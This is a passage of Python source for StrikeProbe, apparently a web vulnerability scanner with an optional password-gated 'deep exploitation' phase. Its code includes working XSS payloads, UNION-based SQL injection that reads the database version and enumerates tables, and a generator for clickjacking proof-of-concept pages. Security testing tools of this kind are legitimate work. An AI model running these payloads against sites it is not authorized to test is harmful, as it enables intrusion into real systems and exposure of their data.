        "  🔒  DEEP EXPLOITATION PHASE — AUTHORIZATION REQUIRED  🔒  ",
        "",
        "  This phase performs deeper, still-non-destructive probes:",
        "    • Escalated XSS payloads with PoC URL generation",
        "    • UNION-based SQLi: column enumeration, DB version, table names",
        "    • Clickjacking PoC HTML file generation",
        "    • Software version CVE correlation",
        "",
        "  All attacks remain fully READ-ONLY.",
        "  You must have written authorization to scan this target.",
    ], color=YELLOW)

    for attempt in range(1, max_attempts + 1):
        try:
            pwd = getpass.getpass(f"\n  🔑 Password [{attempt}/{max_attempts}]: ")
        except (EOFError, KeyboardInterrupt):
            print(f"\n  {RED}[-] Input cancelled.{RESET}")
            return False
        if _verify_password(pwd):
            print(f"\n  {GREEN}{BOLD}✓ Access granted. Initiating deep exploitation...{RESET}\n")
            return True
        remaining = max_attempts - attempt
        if remaining > 0:
            print(f"  {RED}[-] Incorrect password. {remaining} attempt(s) remaining.{RESET}")
        else:
            print(f"  {RED}[-] Maximum attempts reached. Deep phase skipped.{RESET}")
    return False


# ─────────────────────────────────────────────
# Deep Exploitation Modules
# ─────────────────────────────────────────────
def exploit_clickjacking(session, target_url, missing_headers):
    result = {"vulnerable": False, "details": ""}
    if "X-Frame-Options" not in missing_headers:
        resp = safe_get(session, target_url)
        if resp and "frame-ancestors" in resp.headers.get("Content-Security-Policy", "").lower():
            result["details"] = "CSP frame-ancestors blocks framing."
            return result
        result["details"] = "X-Frame-Options present."
        return result
    resp = safe_get(session, target_url)
    if resp and "frame-ancestors" in resp.headers.get("Content-Security-Policy", "").lower():
        result["details"] = "CSP frame-ancestors blocks framing."
        return result
    result["vulnerable"] = True
    result["details"] = "Target CAN be embedded in an iframe. Clickjacking is possible."
    poc = f'<!DOCTYPE html><html><head><title>Clickjacking PoC</title></head><body>\n<h2>Clickjacking PoC — StrikeProbe</h2>\n<p>Target embedded below (50% opacity). If visible, the site is vulnerable.</p>\n<iframe src="{target_url}" width="100%" height="600" style="opacity:0.5;border:2px solid red;"></iframe>\n</body></html>'
    poc_path = "clickjack_poc.html"
    with open(poc_path, "w", encoding="utf-8") as f:
        f.write(poc)
    result["poc_file"] = poc_path
    return result

def exploit_xss_deep(session, xss_findings, delay=0):
    results = []
    escalation = [
        '<script>alert("StrikeProbe-XSS")</script>',
        '<img src=x onerror=alert("StrikeProbe-XSS")>',
        '"><script>alert("StrikeProbe-XSS")</script>',
        "';alert('StrikeProbe-XSS');//",
        '<svg onload=alert("StrikeProbe-XSS")>',
    ]
    for finding in xss_findings:
        param = finding["param"]
        base_url = finding.get("url") or finding.get("form_action", "")
        entry = {"param": param, "base_url": base_url, "reflected_payloads": [], "poc_urls": [], "context": "unknown"}
        for payload in escalation:
            resp = safe_get(session, _inject_param(base_url, param, payload))
            if resp and payload in resp.text:
                entry["reflected_payloads"].append(payload)
                entry["poc_urls"].append(_inject_param(base_url, param, payload))
                body = resp.text
                idx = body.find(payload)
                if idx > -1:
                    surr = body[max(0, idx-50):idx+len(payload)+50]
                    if "<script" in surr.lower(): entry["context"] = "inside <script> block"
                    elif "onerror" in surr.lower() or "onload" in surr.lower(): entry["context"] = "inside event attribute"
                    elif "<" in payload: entry["context"] = "HTML body (tag injection)"
                    else: entry["context"] = "reflected in HTML body"
            if delay: time.sleep(delay)
        if entry["reflected_payloads"]:
            results.append(entry)
    return results

def exploit_sqli_deep(session, sqli_findings, delay=0):
    results = []
    for finding in sqli_findings:
        param = finding["param"]
        base_url = finding.get("url") or finding.get("form_action", "")
        entry = {"param": param, "base_url": base_url, "columns_detected": None, "db_version": None, "db_type": None, "tables_found": []}
        # Detect column count
        num_columns = None
        for i in range(1, 21):
            resp = safe_get(session, _inject_param(base_url, param, f"' ORDER BY {i}-- -"))
            if resp and any(sig in resp.text.lower() for sig in SQLI_ERROR_SIGNATURES) and i > 1:
                num_columns = i - 1
                break
            if delay: time.sleep(delay)
        entry["columns_detected"] = num_columns
        if num_columns:
            for ver_func, db_type in [("version()","MySQL/PostgreSQL"),("@@version","MySQL/MSSQL"),("sqlite_version()","SQLite")]:
                for pos in range(num_columns):
                    cols = ["NULL"] * num_columns
                    cols[pos] = ver_func
                    resp = safe_get(session, _inject_param(base_url, param, f"' UNION SELECT {','.join(cols)}-- -"))
                    if resp:
                        m = re.search(r'(\d+\.\d+\.\d+[-\w]*)', resp.text)
                        if m:
                            entry["db_version"] = m.group(1)
                            entry["db_type"] = db_type
                            break
                if entry["db_version"]: break
                if delay: time.sleep(delay)
            # Table enumeration
            cols = ["NULL"] * num_columns
            cols[0] = "table_name"
            tbl_payload = f"' UNION SELECT {','.join(cols)} FROM information_schema.tables WHERE table_schema=database() LIMIT 10-- -"
            resp = safe_get(session, _inject_param(base_url, param, tbl_payload))
            baseline = safe_get(session, base_url)
            if resp and baseline:
                new_words = set(resp.text.split()) - set(baseline.text.split())
                entry["tables_found"] = [w.strip("</>,\"';") for w in new_words if w.isidentifier() and len(w) > 2][:15]
        results.append(entry)
    return results

def exploit_info_disclosure(session, info_headers):
    results = []
    for h, v in info_headers.items():
        entry = {"header": h, "value": v, "known_issue": None, "severity": "INFO"}
        for pattern, info in KNOWN_VERSION_ISSUES.items():
            if pattern.lower() in v.lower():
                entry["known_issue"] = info["detail"]
                entry["severity"] = info["severity"]
                break
        results.append(entry)
    return results

def print_exploit_report(results, report):
    print_section("⚡  DEEP EXPLOITATION RESULTS")
    cj = results.get("clickjacking", {})
    print(f"\n  {BOLD}[1] CLICKJACKING{RESET}")
    if cj.get("vulnerable"):
        print(f"  {severity_badge('HIGH')} VULNERABLE — {cj['details']}")
        if cj.get("poc_file"):
            print(f"  {BOLD}PoC HTML:{RESET} {GREEN}{cj['poc_file']}{RESET} (open in a browser to confirm)")
    else:
        print(f"  {GREEN}✓ NOT VULNERABLE — {cj.get('details','Protected.')}{RESET}")

    info_results = results.get("info_disclosure_deep", [])
    if info_results:
        print(f"\n  {BOLD}[2] VERSION CVE CORRELATION{RESET}")
        for e in info_results:
            print(f"    {BOLD}{e['header']}: {e['value']}{RESET}")
            if e.get("known_issue"):
                print(f"    {severity_badge(e['severity'])} {e['known_issue']}")
            else:
                print(f"    {DIM}No known critical issues.{RESET}")

    xss_results = results.get("xss_deep", [])
    if xss_results:
        print(f"\n  {BOLD}[3] ESCALATED XSS{RESET}")
        for e in xss_results:
            print(f"    {severity_badge('HIGH')} Param: {BOLD}{e['param']}{RESET}  Context: {e['context']}")
            print(f"    Payloads that reflected: {len(e['reflected_payloads'])}")
            for poc_url in e["poc_urls"][:2]:
                print(f"    PoC: {poc_url}")

    sqli_results = results.get("sqli_deep", [])
    if sqli_results:
        print(f"\n  {BOLD}[4] DEEP SQL INJECTION (READ-ONLY){RESET}")
        for e in sqli_results:
            print(f"    {severity_badge('CRITICAL')} Param: {BOLD}{e['param']}{RESET}")
            print(f"    Endpoint  : {e['base_url']}")
            if e["columns_detected"]: print(f"    Columns   : {e['columns_detected']}")
            if e["db_version"]: print(f"    DB Version: {BOLD}{e['db_version']}{RESET} ({e['db_type']})")
            if e["tables_found"]:
                print(f"    Tables    : {', '.join(e['tables_found'][:10])}")

    print_section("EXPLOITATION SUMMARY")
    exploited = []
    if cj.get("vulnerable"): exploited.append("Clickjacking")
    if xss_results: exploited.append(f"XSS ({len(xss_results)} endpoint(s))")
    if any(e.get("db_version") for e in sqli_results): exploited.append(f"SQLi DB version extraction ({len(sqli_results)} endpoint(s))")
    if any(e.get("known_issue") for e in info_results): exploited.append("Outdated / EOL software")
    if exploited:
        print(f"\n  {severity_badge('CRITICAL')} Successfully demonstrated:")
        for item in exploited:
            print(f"    ✗ {item}")
        print(f"\n  {BOLD}Immediate remediation required. See fix guidance above.{RESET}")
    else:
        print(f"\n  {GREEN}{BOLD}✓ No vulnerabilities successfully exploited in deep phase.{RESET}")
    print(f"\n{'═' * 68}\n")

def exploit_phase(session, report, delay=0, password_arg=None, password_stdin=False):
    """Password-gated deep exploitation phase."""
    print_section("🔒  DEEP EXPLOITATION PHASE")
    # Verify password (prefer env var or stdin to avoid leaking in shell history)
    effective_password = None
    env_pwd = os.environ.get("STRIKEPROBE_EXPLOIT_PASSWORD")
    if env_pwd:
        effective_password = env_pwd

    if not effective_password and password_stdin:
        if sys.stdin is not None and not sys.stdin.isatty():
            try:
                line = sys.stdin.readline()
                effective_password = line.rstrip("\r\n") if line else None
            except Exception:
                effective_password = None
        else:
            effective_password = None

    if not effective_password and password_arg:
        effective_password = password_arg

    if effective_password is not None:
        if password_arg and not env_pwd and not password_stdin:
            print(f"  {YELLOW}[!] Note: --password can be exposed via process listings/history. Prefer STRIKEPROBE_EXPLOIT_PASSWORD or --password-stdin.{RESET}")
        if _verify_password(effective_password):
            src = "environment" if env_pwd else "stdin" if password_stdin and not password_arg else "CLI flag"
            print(f"  {GREEN}✓ Password accepted via {src}.{RESET}\n")
        else:
            print(f"  {RED}[-] Incorrect password provided. Deep phase skipped.{RESET}")
            return None
    else:
        if not _prompt_for_password():
            return None

    exploit_results = {"clickjacking": {}, "info_disclosure_deep": [], "xss_deep": [], "sqli_deep": []}
    hdr = report["header_analysis"]

    print(f"[*] Deep test 1 — Clickjacking...")
    exploit_results["clickjacking"] = exploit_clickjacking(session, report["target"], hdr["missing_headers"])

    if hdr.get("info_disclosure"):
        print(f"[*] Deep test 2 — Version CVE correlation...")
        exploit_results["info_disclosure_deep"] = exploit_info_disclosure(session, hdr["info_disclosure"])

    if report.get("xss"):
        print(f"[*] Deep test 3 — Escalated XSS ({len(report['xss'])} finding(s))...")
        exploit_results["xss_deep"] = exploit_xss_deep(session, report["xss"], delay=delay)

    if report.get("sqli"):
        print(f"[*] Deep test 4 — Deep SQLi probing (read-only, {len(report['sqli'])} finding(s))...")
        exploit_results["sqli_deep"] = exploit_sqli_deep(session, report["sqli"], delay=delay)

    print_exploit_report(exploit_results, report)
    return exploit_results


# ─────────────────────────────────────────────
# Main Scanner
# ─────────────────────────────────────────────
ALL_MODULES = [
    "headers","sqli","xss","ssti","cmdi","path_traversal",
    "ssrf","open_redirect","cors","crlf","host_header",
    "xxe","csrf","idor","subdomain_takeover","http_smuggling","jwt",
]

def run_scanner(args):
    setup_logging(verbose=args.verbose)
    if not args.no_banner:
        print(BANNER)

    target_url = args.url
    if not target_url:
        try:
            target_url = input("\n[?] Target URL (e.g. https://example.com): ").strip()
        except EOFError:
            print("[-] No URL provided. Usage: python strikeprobe_v31.py https://example.com -y")
            sys.exit(1)

    if not target_url.startswith(("http://", "https://")):
        target_url = "https://" + target_url

    modules_to_run = [m.strip().lower() for m in args.modules.split(",")] if args.modules else ALL_MODULES

    print("\n" + "═" * 60)
    print("  DISCLAIMER — READ BEFORE PROCEEDING")
    print("═" * 60)
    print("  StrikeProbe v3.1 performs NON-DESTRUCTIVE scans only.")
    print("  No data on the target will be modified or deleted.")
    print("  You MUST have explicit written authorization to scan.")
    print("═" * 60)

    if not args.yes:
        try:
            if input(f"\n[?] You have authorization to scan {target_url}? (y/N): ").strip().lower() != "y":
                print("[-] Scan aborted.")
                sys.exit(0)
        except EOFError:
            print("[-] Use -y / --yes to skip consent prompt in non-interactive mode.")
            sys.exit(1)

    print(f"\n[*] Target  : {target_url}")
    print(f"[*] Depth   : {args.depth}")
    print(f"[*] Threads : {args.threads}")
    print(f"[*] Modules : {len(modules_to_run)}")

    session = build_session(timeout=(min(args.timeout, 10), args.timeout))
    session._verify_ssl = not args.insecure
    if args.insecure:
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    report = {
        "target": target_url,
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "scanner_version": VERSION,
        "modules_run": [],
        "header_analysis": {},
        "endpoints_found": 0, "forms_found": 0, "js_urls_found": 0,
        "interesting_paths": [],
        "sqli": [], "xss": [], "ssti": [], "cmdi": [],
        "path_traversal": [], "ssrf": [], "open_redirect": [],
        "cors": [], "crlf": [], "host_header": [],
        "xxe": [], "csrf": [], "idor": [],
        "subdomain_takeover": [], "http_smuggling": [], "jwt": [],
    }

    # Crawl
    print(f"\n[*] Phase 1 — Crawling (depth={args.depth})...")
    crawl_data = crawl(session, target_url, max_depth=args.depth, delay=args.delay, max_threads=args.threads)
    report.update({
        "endpoints_found": len(crawl_data["urls"]),
        "forms_found": len(crawl_data["forms"]),
        "js_urls_found": len(crawl_data["js_urls"]),
        "interesting_paths": crawl_data.get("interesting_paths", []),
    })
    all_urls = set(list(crawl_data["urls"] | crawl_data["js_urls"])[:100])
    forms = crawl_data["forms"][:30]
    print(f"[+] {len(crawl_data['urls'])} links, {len(forms)} forms, {len(crawl_data['interesting_paths'])} sensitive paths")

    # Headers
    if "headers" in modules_to_run:
        print(f"[*] Phase 2 — Security headers & cookies...")
        report["header_analysis"] = check_security_headers(session, target_url)
        report["modules_run"].append("Headers & Cookies")

    # Parallel injection modules
    def run_module(url_func, form_func, key):
        findings = []
        with ThreadPoolExecutor(max_workers=8) as pool:
            futs = []
            if url_func:
                futs += [pool.submit(url_func, session, u, args.delay) for u in all_urls]
            if form_func:
                futs += [pool.submit(form_func, session, f, args.delay) for f in forms]
            for fut in as_completed(futs):
                try: findings.extend(fut.result())
                except Exception: pass
        return key, findings

    injection_modules = []
    for name, uf, ff, key in [
        ("SQLi", test_sqli_url, test_sqli_form, "sqli"),
        ("XSS", test_xss_url, test_xss_form, "xss"),
        ("SSTI", test_ssti_url, test_ssti_form, "ssti"),
        ("CMDi", test_cmdi_url, test_cmdi_form, "cmdi"),
        ("Path Traversal", test_path_traversal_url, test_path_traversal_form, "path_traversal"),
        ("SSRF", test_ssrf_url, None, "ssrf"),
        ("Open Redirect", test_open_redirect, None, "open_redirect"),
        ("CRLF", test_crlf, None, "crlf"),
    ]:
        if key in modules_to_run:
            injection_modules.append((name, uf, ff, key))

    if injection_modules:
        print(f"[*] Phase 3 — {len(injection_modules)} injection modules (parallel)...")
        with ThreadPoolExecutor(max_workers=args.threads) as executor:
            futures = {executor.submit(run_module, uf, ff, key): name for name, uf, ff, key in injection_modules}
            for future in as_completed(futures):
                mod_name = futures[future]
                try:
                    rkey, findings = future.result()
                    report[rkey] = findings
                    status = f"{RED}✗ {len(findings)} found{RESET}" if findings else f"{GREEN}✓ Clean{RESET}"
                    print(f"    [{status}] {mod_name}")
                    report["modules_run"].append(mod_name)
                except Exception as e:
                    print(f"    [!] {mod_name}: {e}")

    # Remaining modules
    for key, func, label in [
        ("cors", lambda: test_cors(session, target_url, args.delay), "CORS"),
        ("host_header", lambda: test_host_header(session, target_url, args.delay), "Host Header"),
        ("http_smuggling", lambda: test_http_smuggling(session, target_url, args.delay), "HTTP Smuggling"),
        ("jwt", lambda: test_jwt(session, target_url, args.delay), "JWT"),
        ("csrf", lambda: test_csrf(session, forms, args.delay), "CSRF"),
        ("idor", lambda: test_idor(session, all_urls, args.delay), "IDOR"),
        ("subdomain_takeover", lambda: test_subdomain_takeover(session, target_url, args.delay), "Subdomain Takeover"),
    ]:
        if key in modules_to_run:
            findings = func()
            report[key] = findings
            status = f"{RED}✗ {len(findings)} found{RESET}" if findings else f"{GREEN}✓ Clean{RESET}"
            print(f"    [{status}] {label}")
            report["modules_run"].append(label)

    if "xxe" in modules_to_run:
        xxe = test_xxe(session, target_url, args.delay)
        for form in forms:
            if form["method"] == "POST":
                xxe.extend(test_xxe(session, form["action"], args.delay))
        report["xxe"] = xxe
        status = f"{RED}✗ {len(xxe)} found{RESET}" if xxe else f"{GREEN}✓ Clean{RESET}"
        print(f"    [{status}] XXE")
        report["modules_run"].append("XXE")

    # Report
    print_report(report)

    if args.output:
        export_json(report, args.output)
    if args.html:
        generate_html_report(report, args.html)

    # Deep exploitation phase
    has_issues = any(report.get(k) for k in ["sqli","xss","ssti","cmdi","path_traversal"]) or \
                 report.get("header_analysis", {}).get("info_disclosure")

    if has_issues and not args.skip_exploit:
        if args.exploit or args.password:
            proceed = "y"
        else:
            try:
                proceed = input("\n[?] Proceed to deep exploitation phase? (requires password) (y/N): ").strip().lower()
            except EOFError:
                proceed = "n"

        if proceed == "y":
            ex = exploit_phase(session, report, delay=args.delay, password_arg=args.password, password_stdin=args.password_stdin)
            if ex and args.output:
                export_json({"scan": report, "exploitation": ex}, args.output.replace(".json", "_deep.json"))


# ─────────────────────────────────────────────
# CLI
# ─────────────────────────────────────────────
def parse_args(argv=None):
    p = argparse.ArgumentParser(
        prog="strikeprobe",
        description="StrikeProbe v3.1 — Enterprise Non-Destructive Web Vulnerability Scanner",
        epilog="Example: python strikeprobe_v31.py https://example.com -y -o report.json --html report.html",
    )
    p.add_argument("url", nargs="?", default=None, help="Target URL")
    p.add_argument("-o", "--output", metavar="FILE", help="Save JSON report")
    p.add_argument("--html", metavar="FILE", help="Save HTML report")
    p.add_argument("-d", "--delay", type=float, default=0, help="Delay between requests (seconds)")
    p.add_argument("-t", "--timeout", type=int, default=15, help="Request timeout (seconds)")
    p.add_argument("--depth", type=int, default=3, help="Crawler depth (default: 3)")
    p.add_argument("--threads", type=int, default=5, help="Concurrent threads (default: 5)")
    p.add_argument("--modules", type=str, default=None, help="Comma-separated modules to run (default: all)")
    p.add_argument("-v", "--verbose", action="store_true", help="Debug logging")
    p.add_argument("-y", "--yes", action="store_true", help="Skip consent prompt")
    p.add_argument("--no-banner", action="store_true", help="Suppress banner")
    p.add_argument("--skip-exploit", action="store_true", help="Skip exploitation phase")
    p.add_argument("--password", type=str, default=None, help="Exploitation phase password (CLI)")
    p.add_argument("--password-stdin", action="store_true", help="Read exploitation password from stdin")
    p.add_argument("--exploit", action="store_true", help="Auto-proceed to exploitation phase")
    p.add_argument("--insecure", action="store_true", help="Disable TLS certificate verification (not recommended)")
    p.add_argument("--version", action="version", version=f"%(prog)s {VERSION}")
    return p.parse_args(argv)

if __name__ == "__main__":
    try:
        run_scanner(parse_args())
    except KeyboardInterrupt:
        print("\n[!] Scan interrupted.")
        sys.exit(130)